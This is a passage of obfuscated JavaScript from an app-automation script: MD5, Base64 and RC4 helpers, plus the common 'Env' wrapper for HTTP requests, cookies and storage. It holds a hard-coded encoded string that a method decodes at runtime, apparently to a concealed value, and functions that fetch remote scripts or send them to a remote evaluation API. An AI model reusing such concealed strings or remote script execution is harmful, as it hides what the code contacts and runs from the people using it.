    _0x2b9961 = _0x2c32af(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 12], _0x45ce9f, 2368359562);
    _0x3bb951 = _0x3c781f(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 5], _0x4adc7d, 4294588738);
    _0xb1d666 = _0x3c781f(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 8], _0x58c409, 2272392833);
    _0x12c3f7 = _0x3c781f(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 11], _0x5ded20, 1839030562);
    _0x2b9961 = _0x3c781f(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 14], _0xfe1c9b, 4259657740);
    _0x3bb951 = _0x3c781f(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 1], _0x4adc7d, 2763975236);
    _0xb1d666 = _0x3c781f(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 4], _0x58c409, 1272893353);
    _0x12c3f7 = _0x3c781f(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 7], _0x5ded20, 4139469664);
    _0x2b9961 = _0x3c781f(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 10], _0xfe1c9b, 3200236656);
    _0x3bb951 = _0x3c781f(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 13], _0x4adc7d, 681279174);
    _0xb1d666 = _0x3c781f(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 0], _0x58c409, 3936430074);
    _0x12c3f7 = _0x3c781f(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 3], _0x5ded20, 3572445317);
    _0x2b9961 = _0x3c781f(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 6], _0xfe1c9b, 76029189);
    _0x3bb951 = _0x3c781f(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 9], _0x4adc7d, 3654602809);
    _0xb1d666 = _0x3c781f(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 12], _0x58c409, 3873151461);
    _0x12c3f7 = _0x3c781f(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 15], _0x5ded20, 530742520);
    _0x2b9961 = _0x3c781f(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 2], _0xfe1c9b, 3299628645);
    _0x3bb951 = _0x318eda(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 0], _0x213e30, 4096336452);
    _0xb1d666 = _0x318eda(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 7], _0x2d346f, 1126891415);
    _0x12c3f7 = _0x318eda(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 14], _0x2eaa3c, 2878612391);
    _0x2b9961 = _0x318eda(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 5], _0x522389, 4237533241);
    _0x3bb951 = _0x318eda(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 12], _0x213e30, 1700485571);
    _0xb1d666 = _0x318eda(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 3], _0x2d346f, 2399980690);
    _0x12c3f7 = _0x318eda(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 10], _0x2eaa3c, 4293915773);
    _0x2b9961 = _0x318eda(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 1], _0x522389, 2240044497);
    _0x3bb951 = _0x318eda(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 8], _0x213e30, 1873313359);
    _0xb1d666 = _0x318eda(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 15], _0x2d346f, 4264355552);
    _0x12c3f7 = _0x318eda(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 6], _0x2eaa3c, 2734768916);
    _0x2b9961 = _0x318eda(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 13], _0x522389, 1309151649);
    _0x3bb951 = _0x318eda(_0x3bb951, _0x2b9961, _0x12c3f7, _0xb1d666, _0x4d372d[_0x4de23e + 4], _0x213e30, 4149444226);
    _0xb1d666 = _0x318eda(_0xb1d666, _0x3bb951, _0x2b9961, _0x12c3f7, _0x4d372d[_0x4de23e + 11], _0x2d346f, 3174756917);
    _0x12c3f7 = _0x318eda(_0x12c3f7, _0xb1d666, _0x3bb951, _0x2b9961, _0x4d372d[_0x4de23e + 2], _0x2eaa3c, 718787259);
    _0x2b9961 = _0x318eda(_0x2b9961, _0x12c3f7, _0xb1d666, _0x3bb951, _0x4d372d[_0x4de23e + 9], _0x522389, 3951481745);
    _0x3bb951 = _0x58f272(_0x3bb951, _0x1d5851);
    _0x2b9961 = _0x58f272(_0x2b9961, _0x354b5c);
    _0x12c3f7 = _0x58f272(_0x12c3f7, _0x4284d6);
    _0xb1d666 = _0x58f272(_0xb1d666, _0x1a53f9);
  }
  var _0x2fdb48 = _0x1912f2(_0x3bb951) + _0x1912f2(_0x2b9961) + _0x1912f2(_0x12c3f7) + _0x1912f2(_0xb1d666);
  return _0x2fdb48.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x529e7c) {
    var _0x5d4821 = "",
      _0xf1ce90,
      _0x3c4818,
      _0x4ae72c,
      _0x554fd8,
      _0xec8fd2,
      _0x3ffc39,
      _0xb4ff0,
      _0x55b998 = 0;
    _0x529e7c = _utf8_encode(_0x529e7c);
    while (_0x55b998 < _0x529e7c.length) {
      _0xf1ce90 = _0x529e7c.charCodeAt(_0x55b998++);
      _0x3c4818 = _0x529e7c.charCodeAt(_0x55b998++);
      _0x4ae72c = _0x529e7c.charCodeAt(_0x55b998++);
      _0x554fd8 = _0xf1ce90 >> 2;
      _0xec8fd2 = (_0xf1ce90 & 3) << 4 | _0x3c4818 >> 4;
      _0x3ffc39 = (_0x3c4818 & 15) << 2 | _0x4ae72c >> 6;
      _0xb4ff0 = _0x4ae72c & 63;
      if (isNaN(_0x3c4818)) {
        _0x3ffc39 = _0xb4ff0 = 64;
      } else {
        isNaN(_0x4ae72c) && (_0xb4ff0 = 64);
      }
      _0x5d4821 = _0x5d4821 + _keyStr.charAt(_0x554fd8) + _keyStr.charAt(_0xec8fd2) + _keyStr.charAt(_0x3ffc39) + _keyStr.charAt(_0xb4ff0);
    }
    return _0x5d4821;
  };
  this.decode = function (_0xce39ed) {
    var _0x1e3e82 = "",
      _0x95b186,
      _0x431276,
      _0x609911,
      _0x51301b,
      _0x40fa25,
      _0x39712b,
      _0x241d81,
      _0x28fc7e = 0;
    _0xce39ed = _0xce39ed.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x28fc7e < _0xce39ed.length) {
      _0x51301b = _keyStr.indexOf(_0xce39ed.charAt(_0x28fc7e++));
      _0x40fa25 = _keyStr.indexOf(_0xce39ed.charAt(_0x28fc7e++));
      _0x39712b = _keyStr.indexOf(_0xce39ed.charAt(_0x28fc7e++));
      _0x241d81 = _keyStr.indexOf(_0xce39ed.charAt(_0x28fc7e++));
      _0x95b186 = _0x51301b << 2 | _0x40fa25 >> 4;
      _0x431276 = (_0x40fa25 & 15) << 4 | _0x39712b >> 2;
      _0x609911 = (_0x39712b & 3) << 6 | _0x241d81;
      _0x1e3e82 = _0x1e3e82 + String.fromCharCode(_0x95b186);
      _0x39712b != 64 && (_0x1e3e82 = _0x1e3e82 + String.fromCharCode(_0x431276));
      _0x241d81 != 64 && (_0x1e3e82 = _0x1e3e82 + String.fromCharCode(_0x609911));
    }
    _0x1e3e82 = _utf8_decode(_0x1e3e82);
    return _0x1e3e82;
  };
  _utf8_encode = function (_0x3f50ea) {
    _0x3f50ea = _0x3f50ea.replace(/\r\n/g, "\n");
    var _0x2965b9 = "";
    for (var _0x48945c = 0; _0x48945c < _0x3f50ea.length; _0x48945c++) {
      var _0x2a9a87 = _0x3f50ea.charCodeAt(_0x48945c);
      if (_0x2a9a87 < 128) {
        _0x2965b9 += String.fromCharCode(_0x2a9a87);
      } else {
        _0x2a9a87 > 127 && _0x2a9a87 < 2048 ? (_0x2965b9 += String.fromCharCode(_0x2a9a87 >> 6 | 192), _0x2965b9 += String.fromCharCode(_0x2a9a87 & 63 | 128)) : (_0x2965b9 += String.fromCharCode(_0x2a9a87 >> 12 | 224), _0x2965b9 += String.fromCharCode(_0x2a9a87 >> 6 & 63 | 128), _0x2965b9 += String.fromCharCode(_0x2a9a87 & 63 | 128));
      }
    }
    return _0x2965b9;
  };
  _utf8_decode = function (_0x33d05e) {
    c1 = c2 = 0;
    var _0x43c43f = "",
      _0x51c6ad = 0,
      _0x39d980 = c1;
    while (_0x51c6ad < _0x33d05e.length) {
      _0x39d980 = _0x33d05e.charCodeAt(_0x51c6ad);
      if (_0x39d980 < 128) {
        _0x43c43f += String.fromCharCode(_0x39d980);
        _0x51c6ad++;
      } else {
        _0x39d980 > 191 && _0x39d980 < 224 ? (c2 = _0x33d05e.charCodeAt(_0x51c6ad + 1), _0x43c43f += String.fromCharCode((_0x39d980 & 31) << 6 | c2 & 63), _0x51c6ad += 2) : (c2 = _0x33d05e.charCodeAt(_0x51c6ad + 1), c3 = _0x33d05e.charCodeAt(_0x51c6ad + 2), _0x43c43f += String.fromCharCode((_0x39d980 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x51c6ad += 3);
      }
    }
    return _0x43c43f;
  };
}
function rc4(_0xe9e289, _0x5e6c91) {
  var _0x1a0454 = Array(256),
    _0x1d978b = Array(_0xe9e289.length);
  for (var _0x5c81cd = 0; _0x5c81cd < 256; _0x5c81cd++) {
    _0x1a0454[_0x5c81cd] = _0x5c81cd;
    var _0x22d8ae = (_0x22d8ae + _0x1a0454[_0x5c81cd] + _0x5e6c91.charCodeAt(_0x5c81cd % _0x5e6c91.length)) % 256,
      _0x304473 = _0x1a0454[_0x5c81cd];
    _0x1a0454[_0x5c81cd] = _0x1a0454[_0x22d8ae];
    _0x1a0454[_0x22d8ae] = _0x304473;
  }
  for (var _0x5c81cd = 0; _0x5c81cd < _0xe9e289.length; _0x5c81cd++) {
    _0x1d978b[_0x5c81cd] = _0xe9e289.charCodeAt(_0x5c81cd);
  }
  for (var _0x208025 = 0; _0x208025 < _0x1d978b.length; _0x208025++) {
    var _0x5c81cd = (_0x5c81cd + 1) % 256,
      _0x22d8ae = (_0x22d8ae + _0x1a0454[_0x5c81cd]) % 256,
      _0x304473 = _0x1a0454[_0x5c81cd];
    _0x1a0454[_0x5c81cd] = _0x1a0454[_0x22d8ae];
    _0x1a0454[_0x22d8ae] = _0x304473;
    var _0xfbdbd1 = (_0x1a0454[_0x5c81cd] + _0x1a0454[_0x22d8ae] % 256) % 256;
    _0x1d978b[_0x208025] = String.fromCharCode(_0x1d978b[_0x208025] ^ _0x1a0454[_0xfbdbd1]);
  }
  return _0x1d978b.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}